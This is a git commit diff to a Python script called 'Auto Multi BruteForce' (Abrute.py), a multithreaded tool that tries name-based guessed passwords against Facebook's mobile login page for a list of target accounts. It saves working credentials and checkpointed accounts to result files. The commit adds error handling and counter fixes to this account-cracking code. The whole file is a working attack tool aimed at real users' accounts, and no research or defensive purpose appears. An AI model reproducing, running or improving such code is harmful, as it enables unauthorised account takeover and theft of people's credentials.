888eb1c82383049cadbbf65c407868804f189488
NOOBIE <44431105+KANG-NEWBIE@users.noreply.github.com>
2019-06-22 06:48:41 +0700

    Add files via upload

--- src/Abrute.py
+++ src/Abrute.py
@@ -3,10 +3,10 @@ from multiprocessing.pool import  ThreadPool
 
 class AutoB:
 	def __init__(self):
-		self.fnd=[]
-		self.cek=[]
+		self.fnd=0
+		self.cek=0
+		self.hit=0
 		self.tar=[]
-		self.hit=1
 		self.ken=open('toket/token.txt','r').read()
 		self.u='https://graph.facebook.com/{}'
 		self.main()
@@ -22,24 +22,29 @@ class AutoB:
 		except: pass
 
 	def attk(self,idd,name):
-		lid=[name+'123',name+'12345',name.lower()+'123',name.lower()+'12345',self.spas]
-		for x in lid:
-			data={'email':idd,'pass':x}
-			re=requests.post('https://mbasic.facebook.com/login',data=data).text
-			if 'save-device' in re or 'm_sess' in re:
-				pen=open('result/found.txt','a')
-				pen.write(f'{idd}|{x}\n')
-				self.fnd.append('ntaps')
-				break
-			elif 'checkpoint' in re:
-				pen=open('result/cek.txt','a')
-				pen.write(f'{idd}|{x}\n')
-				self.cek.append('yaudah gpp')
-				break
-		print(f'\r[CRACK] >> {self.hit}/{len(self.tar)} F[{len(self.fnd)}] CP[{len(self.cek)}] <<',end='');sys.stdout.flush()
-		self.hit+=1
+		try:
+			lid=[name+'123',name+'12345',name.lower()+'123',name.lower()+'12345',self.spas]
+			for x in lid:
+				data={'email':idd,'pass':x}
+				re=requests.post('https://mbasic.facebook.com/login',data=data).text
+				if 'save-device' in re or 'm_sess' in re:
+					self.fnd+=1
+					pen=open('result/found.txt','a')
+					pen.write(f'{idd}|{x}\n')
+					break
+				elif 'checkpoint' in re:
+					self.cek+=1
+					pen=open('result/cek.txt','a')
+					pen.write(f'{idd}|{x}\n')
+					break
+			self.hit+=1
+			print(f'\r[CRACK] >> {self.hit}/{len(self.tar)} F[{self.fnd}] CP[{self.cek}] <<',end='')
+		except: pass
 
 	def main(self):
+		try:
+			os.mkdir('result')
+		except: pass
 		print("""
 	;;;;;;;;;;;;;;;;;;;;;;;;;
 	; Auto Multi BruteForce ;
@@ -61,14 +66,14 @@ class AutoB:
 			self.tar.append(x)
 		p=ThreadPool(50)
 		p.map(self.nama,self.tar)
-		if 'ntaps' in str(self.fnd) or 'yaudah gpp' in str(self.cek):
-			print("\nFound ["+str(len(self.fnd))+"] CheckPoint ["+str(len(self.cek))+"]")
+		if self.fnd > 0 or self.cek > 0:
+			print("\nFound ["+str(self.fnd)+"] CheckPoint ["+str(self.cek)+"]")
 		else: print("\n[ :( ] nothing found")
-		if len(self.fnd) > 0:
+		if self.fnd > 0:
 			print("found result saved: result/found.txt")
-		if len(self.cek) > 0:
+		if self.cek > 0:
 			print("check result saved: result/cek.txt")
 try:
 	AutoB()
-except Exceptiona as FCK:
+except Exception as FCK:
 	print(f'Err: {FCK}')
